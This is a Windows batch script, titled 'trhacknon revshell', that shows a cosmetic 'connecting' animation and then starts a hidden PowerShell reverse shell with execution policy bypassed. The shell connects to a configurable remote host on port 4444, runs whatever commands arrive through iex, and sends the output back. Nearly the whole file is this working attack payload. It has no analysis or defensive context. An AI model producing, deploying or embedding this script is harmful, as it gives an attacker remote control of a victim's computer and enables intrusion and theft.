@echo off
title trhacknon revshell

:: Config
set LHOST=xxx.xxx.xxx.xxx
set LPORT=4444

:: Animation pendant la connexion
setlocal enabledelayedexpansion
set "anim=[=     ] [==    ] [===   ] [====  ] [===== ] [======]"
for /l %%i in (1,1,12) do (
    for %%a in (%anim%) do (
        <nul set /p=trhacknon connecting %%a ...  ^<nul
        timeout /t 0.3 >nul
        cls
    )
)
echo trhacknon connected!

:: Reverse shell avec PowerShell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command ^
$client = New-Object System.Net.Sockets.TCPClient('%LHOST%',%LPORT');^
$stream = $client.GetStream();^
[byte[]]$bytes = 0..65535|%{0};^
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){^
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);^
$sendback = (iex $data 2>&1 | Out-String );^
$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';^
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);^
$stream.Write($sendbyte,0,$sendbyte.Length);^
$stream.Flush();^
};^
$client.Close()

pause
